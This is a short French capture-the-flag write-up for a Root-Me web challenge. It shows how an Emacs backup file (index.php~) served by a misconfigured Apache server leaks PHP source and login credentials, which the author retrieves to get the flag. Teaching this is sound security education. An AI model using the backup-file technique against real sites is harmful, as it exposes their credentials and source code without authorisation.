# Fichier de sauvegarde

## Procédure

1. Recherche Google

Une recherche m'indique ceci : 

```
Imaginez que vous éditez le fichier config.php, contenant des mots de passe, le fichier config.php~ sera alors créé si vous avez utilisé Emacs. Le contenu du fichier config.php ne sera pas visible si on rentre l'adresse :

http://monsite.fr/config.php 
En revanche, si votre serveur Apache est mal configuré, le contenu du fichier config.php~ sera alors directement acessible via l'url :

http://monsite.fr/config.php~
```

Un fichier est donc accesible pour téléchargement via l'URL à l'aide du caractère ```~```.

2. Exploitation 

Recherche de page index.php ou config.php.<br>
Bingo ! index.php existe bien, je vais donc essayé de soutiré le fichier de sauvegarde à l'aide de l'URL suivante : 

```
http://challenge01.root-me.org/web-serveur/ch11/index.php~
```

Un fichier se télécharge, je l'ouvre et voici le début du code source : 

```
<?php

$username="ch11";
$password="ODXXXXXXXXXXtj";
```

Je saisie les informations dans le formulaire et le flag apparaît.
